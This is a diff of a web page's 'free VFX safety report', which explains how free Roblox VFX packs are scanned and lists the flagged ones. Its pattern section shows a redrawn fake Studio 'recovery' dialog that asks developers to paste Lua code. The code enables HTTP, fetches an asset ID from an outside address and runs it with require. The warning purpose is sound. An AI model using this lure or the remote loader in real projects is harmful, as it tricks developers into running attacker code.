@@ -3,41 +3,276 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Baseplate VFX report: safe packs, flagged packs, and how scanning works</title>
-<meta name="description" content="How Baseplate scans Roblox VFX packs, what safe means, and how to request a re-check.">
+<title>Free VFX safety report · Baseplate</title>
+<meta name="description" content="We scan free Roblox VFX packs every week and list which ones contain code that effects don't need.">
+<meta property="og:title" content="Free VFX safety report · Baseplate">
+<meta property="og:description" content="We scan free Roblox VFX packs every week and list which ones contain code that effects don't need.">
+<meta property="og:image" content="https://abdullahridwan.github.io/baseplate/og.png">
+<link rel="icon" href="favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter+Tight:wght@400;500;600;700&family=Instrument+Serif:ital@0;1&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+/* Baseplate brand kit. Report layout: verdict headline, four counts, one observed pattern, then the flagged list. */
+:root{
+  --blue:#1F4BFF; --blue-wash:#EEF1FF; --ink:#111111; --plate:#F4F2EC; --stone:#55534E;
+  --stone-light:#B9B6AE; --seam:#E6E3DB; --white:#FFFFFF; --mist:#F7F7F5;
+  --flag:#B4231C; --flag-wash:#FCEDEC;
+  --serif:'Instrument Serif', Georgia, serif;
+  --sans:'Inter Tight', system-ui, sans-serif;
+  --mono:'JetBrains Mono', ui-monospace, monospace;
+}
+*{box-sizing:border-box}
+[hidden]{display:none!important}
+body{margin:0;background:var(--white);color:var(--ink);font-family:var(--sans);font-size:16px;line-height:1.55;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+button{font:inherit;color:inherit;background:none;border:0;padding:0;cursor:pointer}
+.wrap{max-width:1120px;margin:0 auto;padding:0 32px}
+.nav{position:sticky;top:0;z-index:50;background:rgba(255,255,255,.88);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--seam)}
+.nav .wrap{display:flex;align-items:center;justify-content:space-between;height:64px;gap:16px}
+.logo{display:flex;align-items:center;gap:9px;font-weight:600;font-size:20px;letter-spacing:-.045em}
+.logo svg{width:22px;height:22px}
+.nav-mid{display:flex;gap:4px}
+.nav-mid a{padding:8px 14px;border-radius:999px;font-size:15px;font-weight:500;color:var(--stone)}
+.nav-mid a:hover,.nav-mid a[aria-current]{color:var(--ink);background:var(--mist)}
+main .wrap{display:flex;flex-direction:column;gap:56px;padding-top:64px;padding-bottom:80px}
+.eyebrow{font-family:var(--mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--stone)}
+h1{font-size:clamp(36px,5.6vw,64px);line-height:1.02;letter-spacing:-.04em;font-weight:600;margin:14px 0 0;max-width:17ch;text-wrap:balance}
+h1 em{font-family:var(--serif);font-weight:400;font-style:italic;letter-spacing:-.01em;color:var(--blue)}
+.lede{font-size:19px;color:var(--stone);max-width:60ch;margin:20px 0 0}
+.counts{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));border-top:1px solid var(--seam);border-bottom:1px solid var(--seam)}
+.count{padding:22px 20px 22px 0;display:flex;flex-direction:column;gap:6px}
+.count+.count{border-left:1px solid var(--seam);padding-left:20px}
+.count b{font-size:42px;font-weight:600;letter-spacing:-.04em;line-height:1;font-variant-numeric:tabular-nums}
+.count.ok b{color:var(--blue)}
+.count.fl b{color:var(--flag)}
+.count span{color:var(--stone);font-size:14px}
+h2{font-size:28px;letter-spacing:-.03em;font-weight:600;margin:0 0 8px;text-wrap:balance}
+.sub{color:var(--stone);margin:0 0 24px;max-width:62ch}
+.pattern{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.1fr);gap:40px;align-items:start}
+.steps{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:20px}
+.steps li{display:grid;grid-template-columns:28px minmax(0,1fr);gap:14px}
+.steps i{font-style:normal;font:500 13px var(--mono);color:var(--blue);padding-top:2px}
+.steps strong{display:block;font-size:17px;margin-bottom:2px}
+.steps p{margin:0;color:var(--stone)}
+.dialog{border:1px solid var(--seam);border-radius:12px;overflow:hidden;background:var(--white);box-shadow:0 18px 40px -24px rgba(17,17,17,.35)}
+.dialog .bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--mist);border-bottom:1px solid var(--seam);font:500 13px var(--sans);color:var(--stone)}
+.dialog .bar span{width:10px;height:10px;border-radius:50%;background:var(--stone-light)}
+.dialog .body{padding:18px 18px 20px;display:flex;flex-direction:column;gap:10px}
+.dialog .body b{font-size:17px}
+.dialog .body p{margin:0;color:var(--stone);font-size:14px}
+.dialog pre{margin:4px 0 0;padding:12px 14px;background:var(--ink);color:#EDEBE5;border-radius:8px;font:400 12.5px/1.6 var(--mono);overflow-x:auto;white-space:pre}
+.dialog .fake{display:flex;gap:8px;justify-content:flex-end}
+.dialog .fake span{font-size:13px;font-weight:600;padding:7px 14px;border-radius:8px;background:var(--blue);color:var(--white)}
+.caption{font-size:13px;color:var(--stone);margin-top:10px}
+.bar2{display:flex;flex-wrap:wrap;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:20px}
+.chips{display:flex;flex-wrap:wrap;gap:8px}
+.chip{font-weight:600;font-size:14px;padding:8px 14px;border-radius:999px;border:1px solid var(--seam);color:var(--ink)}
+.chip[aria-pressed="true"]{background:var(--ink);border-color:var(--ink);color:var(--white)}
+.chip:focus-visible{outline:2px solid var(--blue);outline-offset:2px}
+.list{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px}
+.card{border:1px solid var(--seam);border-radius:14px;padding:18px;display:flex;flex-direction:column;gap:12px;min-width:0}
+.card .head{display:flex;justify-content:space-between;gap:12px;align-items:flex-start}
+.card h3{margin:0;font-size:16px;line-height:1.3;font-weight:600;overflow-wrap:anywhere;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.id{font:400 12px var(--mono);color:var(--stone);white-space:nowrap}
+.tags{display:flex;flex-wrap:wrap;gap:6px}
+.tag{font:500 11.5px var(--mono);padding:3px 8px;border-radius:6px;background:var(--mist);color:var(--stone)}
+.tag.fl{background:var(--flag-wash);color:var(--flag)}
+.obs{margin:0;padding:0;list-style:none;display:flex;flex-direction:column;gap:6px;font-size:14px}
+.obs li{display:grid;grid-template-columns:34px minmax(0,1fr);gap:8px}
+.obs b{font:500 12px var(--mono);color:var(--flag);padding-top:2px}
+.card .foot{display:flex;justify-content:space-between;align-items:center;gap:8px;border-top:1px solid var(--seam);padding-top:10px;margin-top:auto;font-size:13px;color:var(--stone)}
+.card .foot a{color:var(--blue);font-weight:600}
+.card .foot a:hover{text-decoration:underline}
+.empty{color:var(--stone)}
+.notice{background:var(--plate);border-radius:16px;padding:28px;display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:28px}
+.notice h2{font-size:22px}
+.notice p{margin:0 0 10px;color:var(--stone);font-size:15px}
+.notice ul{margin:0;padding-left:18px;color:var(--stone);font-size:15px;display:flex;flex-direction:column;gap:6px}
+.notice a{color:var(--blue);font-weight:600}
+footer{border-top:1px solid var(--seam);background:var(--mist)}
+footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;padding-top:28px;padding-bottom:28px;font-size:14px;color:var(--stone)}
+@media (max-width:860px){
+  .wrap{padding:0 20px}
+  .nav-mid{display:none}
+  .counts{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .count:nth-child(3){border-left:0;padding-left:0}
+  .count:nth-child(n+3){border-top:1px solid var(--seam)}
+  .pattern,.notice,.list{grid-template-columns:minmax(0,1fr)}
+}
+@media (prefers-reduced-motion:no-preference){.card{transition:border-color .2s}.card:hover{border-color:var(--stone-light)}}
+</style>
 </head>
 <body>
+
+<header class="nav">
+  <div class="wrap">
+    <a class="logo" href="./" aria-label="Baseplate home">
+      <svg viewBox="0 0 100 100" aria-hidden="true"><g fill="#1F4BFF"><circle cx="30" cy="70" r="17"/><circle cx="70" cy="70" r="17"/></g><g fill="none" stroke="#111111" stroke-width="11"><circle cx="30" cy="30" r="11.5"/><circle cx="70" cy="30" r="11.5"/></g></svg>
+      baseplate
+    </a>
+    <nav class="nav-mid" aria-label="Main">
+      <a href="./#how">How it works</a>
+      <a href="./#connect">Games</a>
+      <a href="components/">Components</a>
+      <a href="vfx-report.html" aria-current="page">VFX safety</a>
+    </nav>
+  </div>
+</header>
+
 <main>
-<h1>VFX report</h1>
-<p>Baseplate scans Roblox VFX packs so an agent does not have to guess from titles and thumbnails, and does not pull in malicious code blind.</p>
+  <div class="wrap">
+    <section>
+      <div class="eyebrow" id="stamp">Free VFX safety report</div>
+      <h1>Most free VFX packs are fine. <em>Some carry code you didn't ask for.</em></h1>
+      <p class="lede">Every week we open free VFX packs from the Roblox Creator Store and check every object inside, without running anything. Particle effects don't need scripts, so we flag the packs whose contents match patterns used to run code on your machine or in your game.</p>
+    </section>
 
-<h2>What safe means here</h2>
-<p>A pack is listed as safe only for a pinned version, on a stated scan date, under stated scan rules. If the pack changes after that scan, it must be re-checked before it is used at the new version.</p>
-<p>Scan rules, in plain language:</p>
-<ul>
-<li>Hidden require by ID</li>
-<li>Data exfiltration</li>
-<li>Obfuscated code that phones home</li>
-</ul>
-<p>This list will be updated as scan rules change. A safe result is a scan result for that pinned version, not a guarantee for all future versions.</p>
+    <section class="counts" aria-label="Totals">
+      <div class="count"><b id="n-total">300</b><span>free VFX packs checked</span></div>
+      <div class="count ok"><b id="n-safe">188</b><span>passed every check</span></div>
+      <div class="count fl"><b id="n-flag">70</b><span>flagged</span></div>
+      <div class="count fl"><b id="n-claim">52</b><span>flagged packs whose listing says “no scripts”</span></div>
+    </section>
 
-<h2>Safe packs</h2>
-<p>Safe packs are offered by the Baseplate MCP through find_vfx, with a description, pinned asset ID and version, and scan date. The agent inserts the exact pinned version with the Roblox Studio MCP and strips any scripts in the pack before use.</p>
-<p>Scan data status: the safe VFX index format is live in this repo at registry/safe-vfx.json and docs/r/safe-vfx.json, but real scan data has not landed yet. No asset IDs are listed here until that data lands, so this page does not invent safe packs.</p>
-<p>When scan data lands, safe packs will be listed here with name, description, asset ID, pinned version, and scan date.</p>
+    <section class="pattern">
+      <div>
+        <h2>The most common pattern we found</h2>
+        <p class="sub">Several flagged packs contain the same setup. It only runs inside Roblox Studio, so it targets the developer, not players.</p>
+        <ol class="steps">
+          <li><i>01</i><div><strong>A script inside a particle emitter</strong><p>It sits where you'd never look, and only starts when the pack is in an open Studio session.</p></div></li>
+          <li><i>02</i><div><strong>A fake Studio error window</strong><p>A few seconds later, a window styled like Roblox Studio says your session needs “recovery”.</p></div></li>
+          <li><i>03</i><div><strong>It asks you to paste a command</strong><p>The steps tell you to copy a command into the Command Bar, which runs with full access to your place.</p></div></li>
+          <li><i>04</i><div><strong>The command loads more code</strong><p>It turns on HTTP, asks an outside web address for an asset ID, and loads whatever that asset contains into your game.</p></div></li>
+        </ol>
+      </div>
+      <div>
+        <div class="dialog" aria-label="Illustration of the window">
+          <div class="bar"><span></span>Recovery required</div>
+          <div class="body">
+            <b>Disconnected</b>
+            <p>A required Studio dependency stopped responding. Run the recovery command below from edit mode.</p>
+<pre>local HttpService = game:GetService("HttpService")
+HttpService.HttpEnabled = true
+local id = HttpService:GetAsync("https://…")
+require(tonumber(id))</pre>
+            <div class="fake"><span>Copy</span></div>
+          </div>
+        </div>
+        <p class="caption">Our redrawing of the window's text, taken from inside one flagged pack. The web address is removed. Roblox Studio never asks you to paste a command to recover.</p>
+      </div>
+    </section>
 
-<h2>Flagged packs</h2>
-<p>Flagged packs are never offered by the MCP. They are shown here as warnings only, with the behavior pattern found, not as a way to add them to a game.</p>
-<p>Flagged pack details will be listed here when verified scan results land, with the pattern found and the scan date. Creator names are not published from demo artifacts without verified evidence.</p>
+    <section id="list">
+      <div class="bar2">
+        <div>
+          <h2>Flagged packs</h2>
+          <p class="sub" style="margin:0">What we observed in each file, in plain words. Packs from accounts that still exist are listed first.</p>
+        </div>
+        <div class="chips" role="group" aria-label="Filter">
+          <button class="chip" data-f="all" aria-pressed="true">All <span></span></button>
+          <button class="chip" data-f="active" aria-pressed="false">Active accounts <span></span></button>
+          <button class="chip" data-f="removed" aria-pressed="false">Removed accounts <span></span></button>
+        </div>
+      </div>
+      <div class="list" id="grid"><p class="empty">Loading the latest scan…</p></div>
+    </section>
 
-<h2>Request a re-check</h2>
-<p>If you think a pack was flagged in error, or a safe pack has changed, request a re-check.</p>
-<p>Contact email: to be added by the owner. Until an email is published here, do not send personal account details anywhere for a re-check.</p>
-
-<h2>How to use safe packs</h2>
-<p>Connect Baseplate as an MCP server, then ask your agent to use find_vfx and add_vfx. add_vfx writes a vfx.json lockfile with the pinned asset ID and version.</p>
-<p><a href="index.html#connect">Back to Connect your agent</a></p>
-<p>Baseplate is not affiliated with Roblox.</p>
+    <section class="notice" aria-label="About this report">
+      <div>
+        <h2>What a flag means</h2>
+        <p>A flag is an automated, factual description of what was inside a pack's file on the date we scanned it. It is not a statement about the person who uploaded it or why. Accounts get compromised and packs change hands.</p>
+        <p>Packs change. We check the version that was live on the scan date, so a pack may have been updated or fixed since. Every flag links to the listing so you can check it yourself.</p>
+      </div>
+      <div>
+        <h2>How we check</h2>
+        <ul>
+          <li>We only read public, free packs, and never run their code.</li>
+          <li>Each file is checked against six <a href="r/vfx-rules.md">written rules</a>, the same way every time.</li>
+          <li>The full results, including every pack that passed, are in <a href="r/vfx-assets.json">one open file</a> for agents and people.</li>
+          <li>Baseplate is not affiliated with or endorsed by Roblox Corporation.</li>
+        </ul>
+      </div>
+    </section>
+  </div>
 </main>
+
+<footer>
+  <div class="wrap"><span>&copy; 2026 Baseplate. Free and open source.</span><span>Not affiliated with Roblox.</span></div>
+</footer>
+
+<script>
+(function () {
+  var grid = document.getElementById("grid");
+  function el(tag, cls, text) { var e = document.createElement(tag); if (cls) e.className = cls; if (text != null) e.textContent = text; return e; }
+
+  fetch("r/vfx-assets.json").then(function (r) { return r.json(); }).then(function (data) {
+    var all = data.assets;
+    var flagged = all.filter(function (a) { return a.verdict === "flagged"; });
+    // Active accounts first, then by how many different rules matched.
+    flagged.sort(function (a, b) {
+      if (a.creator_removed !== b.creator_removed) return a.creator_removed ? 1 : -1;
+      return b.observed.length - a.observed.length;
+    });
+    var n = { total: all.length, safe: 0, claim: 0, active: 0, removed: 0 };
+    all.forEach(function (a) { if (a.verdict === "safe") n.safe++; });
+    flagged.forEach(function (a) { if (a.listing_says_no_scripts) n.claim++; if (a.creator_removed) n.removed++; else n.active++; });
+    document.getElementById("n-total").textContent = n.total;
+    document.getElementById("n-safe").textContent = n.safe;
+    document.getElementById("n-flag").textContent = flagged.length;
+    document.getElementById("n-claim").textContent = n.claim;
+    document.getElementById("stamp").textContent = "Free VFX safety report · scanned " + new Date(data.generated).toLocaleDateString("en-US", { day: "numeric", month: "long", year: "numeric" });
+    var chips = document.querySelectorAll(".chip");
+    chips[0].querySelector("span").textContent = flagged.length;
+    chips[1].querySelector("span").textContent = n.active;
+    chips[2].querySelector("span").textContent = n.removed;
+
+    grid.textContent = "";
+    flagged.forEach(function (a) {
+      var c = el("article", "card");
+      c.dataset.removed = a.creator_removed;
+      var head = el("div", "head");
+      head.appendChild(el("h3", null, a.name));
+      head.appendChild(el("span", "id", "#" + a.id));
+      c.appendChild(head);
+
+      var tags = el("div", "tags");
+      var k = a.contains || {};
+      tags.appendChild(el("span", "tag fl", k.scripts + " script" + (k.scripts === 1 ? "" : "s")));
+      if (k.effects) tags.appendChild(el("span", "tag", k.effects + " effects"));
+      if (a.listing_says_no_scripts) tags.appendChild(el("span", "tag", "listing says “no scripts”"));
+      if (a.creator_removed) tags.appendChild(el("span", "tag", "uploader account removed"));
+      c.appendChild(tags);
+
+      var ul = el("ul", "obs");
+      a.observed.forEach(function (o) {
+        var li = el("li"); li.appendChild(el("b", null, o.rule)); li.appendChild(el("span", null, o.observed)); ul.appendChild(li);
+      });
+      c.appendChild(ul);
+
+      var foot = el("div", "foot");
+      foot.appendChild(el("span", null, "Version of " + a.pin.updated.slice(0, 10)));
+      var link = el("a", null, "View listing ↗"); link.href = a.store_url; link.target = "_blank"; link.rel = "noopener nofollow";
+      foot.appendChild(link);
+      c.appendChild(foot);
+      grid.appendChild(c);
+    });
+
+    chips.forEach(function (b) {
+      b.addEventListener("click", function () {
+        chips.forEach(function (x) { x.setAttribute("aria-pressed", x === b ? "true" : "false"); });
+        var f = b.dataset.f;
+        Array.prototype.forEach.call(grid.children, function (c) {
+          var removed = c.dataset.removed === "true";
+          c.hidden = (f === "active" && removed) || (f === "removed" && !removed);
+        });
+      });
+    });
+  }).catch(function () {
+    grid.textContent = "";
+    grid.appendChild(el("p", "empty", "Couldn't load the scan results. Refresh to try again."));
+  });
+})();
+</script>
 </body>
 </html>
